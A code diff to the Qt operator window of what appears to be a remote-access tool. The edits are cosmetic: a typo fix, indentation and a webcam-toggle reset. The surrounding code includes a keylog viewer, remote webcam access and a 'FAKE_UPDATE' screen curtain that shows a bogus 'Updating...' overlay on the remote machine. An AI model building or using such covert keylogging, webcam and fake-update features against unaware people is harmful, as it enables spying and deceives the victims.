@@ -323,11 +323,12 @@ class SessionWindow(QMainWindow):
                 # We expect small step counts here (e.g. +/- 20). Large values indicate an issue.
                 print(f"[!] Warning: Large Scroll Delta Detected: dx={dx}, dy={dy}")
 
-            # Clamp to int16 (Protocol Saftey)
+            # Clamp to int16 (Protocol Safety)
             dx = max(-32768, min(32767, dx))
             dy = max(-32768, min(32767, dy))
             payload = struct.pack('!hh', dx, dy)
-            self.send_command(protocol.OP_SCROLL, payload)            
+            self.send_command(protocol.OP_SCROLL, payload)
+
     def toggle_keylog(self, checked):
         if checked:
             self.keylog_widget.show()
@@ -383,11 +384,11 @@ class SessionWindow(QMainWindow):
             # Send command to Agent to black out their screen
             self.send_command(protocol.OP_CURTAIN_ON, b"BLACK")
         elif curtain_type == "FAKE_UPDATE":
-             self.curtain_overlay.setStyleSheet("background-color: #006dae;") # Blue
-             self.curtain_overlay.setText("↻ Updating...")
-             self.curtain_overlay.setAlignment(Qt.AlignmentFlag.AlignCenter)
-             self.curtain_overlay.setStyleSheet("background-color: #006dae; color: white; font-size: 24px;")
-             self.send_command(protocol.OP_CURTAIN_ON, b"FAKE_UPDATE")
+            self.curtain_overlay.setStyleSheet("background-color: #006dae;") # Blue
+            self.curtain_overlay.setText("↻ Updating...")
+            self.curtain_overlay.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            self.curtain_overlay.setStyleSheet("background-color: #006dae; color: white; font-size: 24px;")
+            self.send_command(protocol.OP_CURTAIN_ON, b"FAKE_UPDATE")
         else:  # IMAGE
             pixmap = QPixmap(data)
             self.curtain_overlay.setPixmap(pixmap.scaled(
@@ -460,6 +461,8 @@ class SessionWindow(QMainWindow):
         print(f"[!] Device Error: {device_type} - {error_msg}")
         
         if device_type == "CAM":
+            # Turn off the cam toggle
+            self.act_cam.setChecked(False)
             self.webcam_win.setWindowTitle(f"Remote Webcam - ERROR: {error_msg}")
             self.webcam_win.close()
             QMessageBox.warning(self, "Webcam Error", f"Remote webcam failed:\n{error_msg}")
